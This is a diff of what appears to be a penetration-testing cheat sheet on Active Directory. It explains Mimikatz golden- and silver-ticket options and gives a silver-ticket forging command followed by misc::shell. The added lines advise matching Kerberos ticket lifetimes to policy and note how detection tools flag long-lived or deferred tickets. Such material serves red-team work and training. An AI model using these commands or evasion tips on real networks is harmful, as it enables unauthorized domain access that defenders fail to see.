@@ -954,9 +954,9 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 <li><strong>/id</strong> -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  </li>
 <li><strong>/sid</strong> -The SID of the domain to generate the ticket for.</li>
 <li><strong>/krbtgt</strong> -The NTLM hash of the KRBTGT account.   </li>
-<li><strong>/endin</strong> - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  </li>
-<li><strong>/renewmax</strong> -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  </li>
-<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used (Pass-the-Ticket).</li>
+<li><strong>/endin</strong> - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)(*1).</li>
+<li><strong>/renewmax</strong> -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)(*1).</li>
+<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used (Pass-the-Ticket). Alternatively, use <strong>/ticket</strong> to save the ticket to a file for later use(*2).</li>
 </ul>
 <p>Generate a silver ticket:</p>
 <div class="highlight"><pre><span></span><code>kerberos::golden<span class="w"> </span>/admin:&lt;Any<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;Domain&gt;<span class="w"> </span>/id:500<span class="w"> </span>/sid:&lt;Domain<span class="w"> </span>SID&gt;<span class="w"> </span>/target:&lt;Hostname<span class="w"> </span>of<span class="w"> </span>server<span class="w"> </span>being<span class="w"> </span>targeted&gt;<span class="w"> </span>/rc4:&lt;NTLM<span class="w"> </span>Hash<span class="w"> </span>of<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>of<span class="w"> </span>target&gt;<span class="w"> </span>/service:cifs<span class="w"> </span>/ptt
@@ -970,10 +970,15 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 <li><strong>/target</strong> - The hostname of our target server.It can be any domain-joined host.  </li>
 <li><strong>/rc4</strong> - The NTLM hash of the machine account of our target. </li>
 <li><strong>/service</strong> - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.  </li>
-<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.</li>
+<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used. Alternatively, use <strong>/ticket</strong> to save the ticket to a file for later use*.</li>
 </ul>
+<p><strong>*Note 1</strong>: Detection tools generally look for tickets lifespan. It's usually better to comply to the Kerberos policy or at least to the AD default settings in order to avoid detection.
+<strong>*Note 2</strong>: Detection tools generally look for tickets whose usage is deferred respect their generation.</p>
 <p>Open a shell with the injected ticket:</p>
 <div class="highlight"><pre><span></span><code>misc::shell
+</code></pre></div>
+<p>List current session's Kerberos tickets:</p>
+<div class="highlight"><pre><span></span><code>klist
 </code></pre></div>
 <h2 id="kerberos_1">Kerberos</h2>
 <p>Brute-force user accounts from a domain controller using a supplied wordlist:</p>
